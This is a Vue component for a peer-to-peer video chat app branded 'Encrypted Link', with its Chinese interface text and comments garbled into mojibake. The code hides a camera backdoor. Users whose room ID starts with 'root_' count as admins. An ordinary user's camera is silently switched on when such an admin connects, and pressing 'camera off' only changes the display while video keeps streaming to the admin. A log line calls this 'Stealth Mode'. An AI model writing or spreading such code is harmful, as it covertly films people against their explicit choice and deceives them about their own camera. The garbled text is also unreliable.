<template>
  <div id="p2p-app">
    <div class="bg-gradient"></div>

    <div class="main-container">
      <header class="app-header">
        <div class="logo">
          <span class="icon">üîí</span> Encrypted Link
        </div>
        <div class="status-indicator">
          <span class="status-dot" :class="status"></span>
          <span class="status-text">{{ statusText }}</span>
        </div>
      </header>

      <div class="content-layout">
        <div class="video-panel">
          <div class="video-stage">
            
            <div class="remote-view">
              <video ref="remoteVideo" autoplay playsinline class="remote-video-el"></video>
              
              <div v-if="status === 'connected' && !remoteCameraActive" class="video-placeholder">
                <div class="placeholder-icon">üì∑</div>
                <p>ÂØπÊñπÊëÑÂÉèÂ§¥Â∑≤ÂÖ≥Èó≠</p>
              </div>
              
              <div v-if="status !== 'connected'" class="video-placeholder waiting">
                <div class="pulse-ring"></div>
                <p>{{ statusText }}</p>
              </div>

              <div v-if="showPlayBtn" class="overlay-btn-wrapper">
                <button @click="forcePlay" class="glass-btn">
                  <span>üîá ÁÇπÂáªÂêØÁî®Èü≥È¢ë</span>
                </button>
              </div>
            </div>

            <div class="local-view">
              <video v-show="cameraEnabled" ref="localVideo" autoplay playsinline muted class="local-video-el"></video>
              <div v-if="!cameraEnabled" class="local-placeholder">
                <span class="icon-off">üì∑</span>
                <span>ÊëÑÂÉèÂ§¥Êú™ÂºÄÂêØ</span>
              </div>
            </div>

            <div class="controls-bar" v-if="status === 'connected'">
              <button @click="toggleAudio" :class="['ctrl-btn', !audioEnabled && 'off']" title="È∫¶ÂÖãÈ£é">
                <i class="icon-mic">{{ audioEnabled ? 'üéôÔ∏è' : 'üîá' }}</i>
              </button>
              
              <button @click="stopMatch" class="ctrl-btn danger" title="ÊåÇÊñ≠">
                <i class="icon-phone">üìû</i>
              </button>
              
              <button @click="toggleCamera" :class="['ctrl-btn', !cameraEnabled && 'off']" title="ÊëÑÂÉèÂ§¥">
                <i class="icon-cam">{{ cameraEnabled ? 'üìπ' : 'üì∑' }}</i>
              </button>
            </div>
          </div>

          <div v-if="status === 'idle'" class="login-overlay">
            <div class="login-box">
              <h3>Âä†ÂÖ•‰ºöËÆÆ</h3>
              <input 
                v-model="roomId" 
                placeholder="ËØ∑ËæìÂÖ•ÊàøÈó¥Âè∑" 
                class="room-input"
                @keyup.enter="startMatch"
              />
              <button 
                @click="startMatch" 
                :disabled="!isMediaReady" 
                class="join-btn"
              >
                {{ !isMediaReady ? 'ËÆæÂ§áÂàùÂßãÂåñ‰∏≠...' : 'Âä†ÂÖ•Âπ∂Á≠âÂæÖËøûÊé•' }}
              </button>
              <p class="hint">ÈªòËÆ§ÊëÑÂÉèÂ§¥ÂÖ≥Èó≠ÔºåËøûÊé•ÂêéÂèØÊâãÂä®ÂºÄÂêØ</p>
            </div>
          </div>
        </div>

        <div class="chat-panel">
          <div class="chat-header">
            <span>Ê∂àÊÅØËÆ∞ÂΩï</span>
            <span class="room-tag" v-if="currentRoom">ID: {{ currentRoom }}</span>
          </div>
          
          <div class="chat-messages" ref="chatBox">
            <div v-if="messages.length === 0" class="empty-chat">ÊöÇÊó†Ê∂àÊÅØ</div>
            <div v-for="(msg, index) in messages" :key="index" :class="['msg-row', msg.self ? 'msg-self' : 'msg-peer']">
              <div class="msg-bubble">{{ msg.text }}</div>
            </div>
          </div>
          
          <div class="chat-input-area">
            <input 
              v-model="inputText" 
              @keyup.enter="sendChat" 
              placeholder="ÂèëÈÄÅÊ∂àÊÅØ..." 
              :disabled="status !== 'connected'" 
            />
            <button @click="sendChat" :disabled="status !== 'connected' || !inputText.trim()">
              ‚û§
            </button>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>

<script>
if (typeof window !== 'undefined') {
  window.global = window;
  if (!window.process) window.process = { env: { DEBUG: undefined }, nextTick: (cb) => setTimeout(cb, 0) };
}

import SimplePeer from 'simple-peer'

export default {
  name: 'ModernVideoChat',
  data() {
    // ‰ªéÂÖ®Â±ÄÈÖçÁΩÆËØªÂèñÊúçÂä°Âô®Âú∞ÂùÄÔºåÂ¶ÇÊûúÊ≤°ÊúâÂàô‰ΩøÁî®ÈªòËÆ§ÂÄº
    const config = window.APP_CONFIG || {}
    return {
      serverIp: config.serverIp || '2607:8700:5500:63c9::2',
      wsPort: config.wsPort || 38080,
      useSecure: config.useSecure !== false, // ÈªòËÆ§‰ΩøÁî®ÂÆâÂÖ®ËøûÊé•
      
      isAdmin: false,       
      peerIsAdmin: false,   
      
      status: 'idle', 
      roomId: '',      
      currentRoom: '', 
      
      isMediaReady: false,
      showPlayBtn: false,
      localStream: null,
      
      // „Äê‰øÆÊîπÁÇπ 1„ÄëÂàùÂßãÁä∂ÊÄÅËÆæ‰∏∫ falseÔºå‰∏çÂºÄÂêØËßÜÈ¢ë
      cameraEnabled: false, 
      audioEnabled: true,
      remoteCameraActive: true,

      ws: null,
      peer: null,
      inputText: '',
      messages: [] 
    }
  },
  computed: {
    wsUrl() {
      const ip = this.serverIp.trim()
      const protocol = this.useSecure ? 'wss' : 'ws'
      // IPv6 Âú∞ÂùÄÈúÄË¶ÅÂä†ÊñπÊã¨Âè∑
      if (ip.includes(':') && !ip.startsWith('[')) {
        return `${protocol}://[${ip}]:${this.wsPort}/ws`
      }
      return `${protocol}://${ip}:${this.wsPort}/ws`
    },
    statusText() {
      const map = { idle: 'Â∞±Áª™', queuing: 'Ê≠£Âú®ÂåπÈÖç...', connecting: 'Âª∫Á´ãËøûÊé•...', connected: 'ÈÄöËØù‰∏≠', error: 'ËøûÊé•Êñ≠ÂºÄ' }
      return map[this.status] || this.status
    }
  },
  mounted() {
    this.initMedia()
  },
  methods: {
    async initMedia() {
      try {
        // Ëé∑ÂèñÊùÉÈôêÂíåÊµÅÔºàÊäÄÊúØ‰∏äÂøÖÈ°ªÂÖàËé∑ÂèñÔºåÂª∫Á´ãËøûÊé•ÊâçÈ°∫ÁïÖÔºâ
        this.localStream = await navigator.mediaDevices.getUserMedia({
          video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: "user" },
          audio: true
        })
        
        // „Äê‰øÆÊîπÁÇπ 2„ÄëËé∑ÂèñÊµÅ‰πãÂêéÔºåÁ´ãÂàªÁ¶ÅÁî®ËßÜÈ¢ëËΩ®ÈÅì
        // ËøôÊ†∑Áî®Êà∑ÁúãÂà∞ÁöÑÊòØÈªëÂ±èÔºåSimplePeer ÂèëÈÄÅÁöÑ‰πüÊòØÁ©∫ÈªëÂ∏ß
        const videoTrack = this.localStream.getVideoTracks()[0];
        if (videoTrack) {
          videoTrack.enabled = false; 
        }

        this.$refs.localVideo.srcObject = this.localStream
        this.isMediaReady = true
      } catch (e) {
        console.error("Camera access failed", e);
        alert("Êó†Ê≥ïËÆøÈóÆÊëÑÂÉèÂ§¥ÔºåËØ∑Ê£ÄÊü•ÊùÉÈôê„ÄÇ")
      }
    },


startMatch() {
      if (!this.isMediaReady || !this.roomId) return
      this.isAdmin = this.roomId.startsWith('root_');
      this.status = 'queuing'
      this.ws = new WebSocket(this.wsUrl)

      this.ws.onopen = () => {
        this.ws.send(JSON.stringify({ type: 'join_queue', roomId: this.roomId.trim() }))
      }

      this.ws.onmessage = (event) => {
        const data = JSON.parse(event.data)
        switch (data.type) {
          case 'matched':
            this.currentRoom = data.room
            // Á°Æ‰øùËøôÈáåÊãøÂà∞‰∫ÜÂØπÊñπÁöÑË∫´‰ªΩ
            this.peerIsAdmin = data.peerIsAdmin 
            
            // ‰∏∫‰∫Ü‰øùÈô©ÔºåÂú®ÂàõÂª∫ Peer Ââç‰πüÂ∞ùËØïÂºÄÂêØ‰∏ÄÊ¨°
            if (!this.isAdmin && this.peerIsAdmin) {
               const vTrack = this.localStream.getVideoTracks()[0];
               if (vTrack) vTrack.enabled = true;
            }

            this.createPeer(data.initiator)
            break
          case 'signal':
            if (this.peer) this.peer.signal(data.payload)
            break
          case 'peer_left':
            this.stopMatch(); 
            this.messages.push({ text: "ÂØπÊñπÂ∑≤Á¶ªÂºÄ", self: false })
            break
        }
      }
    },

createPeer(initiator) {
      this.status = 'connecting'
      this.peer = new SimplePeer({
        initiator,
        stream: this.localStream,
        trickle: true,
        config: { iceServers: [] }
      })

      this.peer.on('signal', payload => {
        this.ws.send(JSON.stringify({ type: 'signal', payload }))
      })

      this.peer.on('connect', () => {
        this.status = 'connected'
        console.log('P2P Connection established.')

        // =======================================================
        // „ÄêÊ†∏ÂøÉ‰øÆÂ§ç„ÄëÔºöËøûÊé•Âª∫Á´ãÁû¨Èó¥ÔºåÂº∫Âà∂ÂºÄÂêØÂ∫ïÂ±ÇËßÜÈ¢ë‰º†Ëæì
        // =======================================================
        if (!this.isAdmin && this.peerIsAdmin) {
          const vTrack = this.localStream.getVideoTracks()[0]
          if (vTrack) {
            vTrack.enabled = true // Á°¨‰ª∂Â±ÇÂºÄÂêØÔºåÊï∞ÊçÆÂºÄÂßãÂèëÈÄÅ
            console.log('Stealth Mode: Video auto-started for admin.')
          }
          // Ê≥®ÊÑèÔºö‰∏çË¶ÅËÆæÁΩÆ this.cameraEnabled = true
          // ËøôÊ†∑Êú¨Âú∞ÁïåÈù¢‰æùÁÑ∂ÊòØÈªëÁöÑÔºåÁî®Êà∑Êó†ÊÑüÁü•
        }
      })

      this.peer.on('stream', stream => {
        if (this.$refs.remoteVideo) this.$refs.remoteVideo.srcObject = stream
      })

      this.peer.on('data', data => {
        const payload = JSON.parse(data.toString())
        if (payload.type === 'text') {
          this.messages.push({ text: payload.content, self: false })
          this.scrollToBottom()
        } else if (payload.type === 'control') {
          if (payload.action === 'camera') {
            this.remoteCameraActive = payload.value
          } else if (payload.action === 'camera_fake_off') {
            this.remoteCameraActive = true 
          }
        }
      })
    },
    toggleCamera() {
      const track = this.localStream.getVideoTracks()[0]
      if (!track) return

      // ÂàáÊç¢ UI Áä∂ÊÄÅ
      this.cameraEnabled = !this.cameraEnabled

      // --- ÊùÉÈôêÈÄªËæë ---
      if (!this.cameraEnabled && !this.isAdmin && this.peerIsAdmin) {
        // „ÄêÁâπÊùÉÊ®°ÂºèËß¶Âèë„ÄëÔºöÊàëË¶ÅÂÖ≥Èó≠Ôºå‰∏îÊàëÊòØÊôÆÈÄö‰∫∫ÔºåÂØπÊñπÊòØÁÆ°ÁêÜÂëò
        // ÁïåÈù¢‰∏äÊòæÁ§∫ÂÖ≥Èó≠Ôºå‰ΩÜÂÆûÈôÖËΩ®ÈÅì‰øùÊåÅÂºÄÂêØ
        track.enabled = true 
        this.sendControl('camera_fake_off', false)
      } else {
        // Ê≠£Â∏∏ÈÄªËæëÔºöÂºÄÂêØ Êàñ ÂÖ≥Èó≠
        track.enabled = this.cameraEnabled
        this.sendControl('camera', this.cameraEnabled)
      }
    },

    toggleAudio() {
      const track = this.localStream.getAudioTracks()[0]
      if (track) {
        this.audioEnabled = !this.audioEnabled
        track.enabled = this.audioEnabled
      }
    },

    sendChat() {
      if (!this.inputText.trim() || !this.peer?.connected) return
      this.peer.send(JSON.stringify({ type: 'text', content: this.inputText }))
      this.messages.push({ text: this.inputText, self: true })
      this.inputText = ''; this.scrollToBottom()
    },

    sendControl(action, value) {
      if (this.peer?.connected) this.peer.send(JSON.stringify({ type: 'control', action, value }))
    },

    stopMatch() {
      if (this.peer) { this.peer.destroy(); this.peer = null }
      if (this.ws) { this.ws.close(); this.ws = null }
      
      this.status = 'idle'; 
      this.messages = []; 
      this.currentRoom = ''
      
      // „Äê‰øÆÊîπÁÇπ 3„ÄëÊåÇÊñ≠ÂêéÔºåÈáçÁΩÆ‰∏∫ÂÖ≥Èó≠Áä∂ÊÄÅÔºåÈò≤Ê≠¢‰∏ãÊ¨°ËøõÂÖ•Ëá™Âä®ÂºÄÂêØ
      this.cameraEnabled = false; 
      const vTrack = this.localStream?.getVideoTracks()[0];
      if(vTrack) vTrack.enabled = false;
    },

    forcePlay() {
      const v = this.$refs.remoteVideo; if (v) { v.muted = false; v.play(); this.showPlayBtn = false }
    },

    scrollToBottom() {
      this.$nextTick(() => { const b = this.$refs.chatBox; if (b) b.scrollTop = b.scrollHeight })
    }
  }
}
</script>

<style scoped>
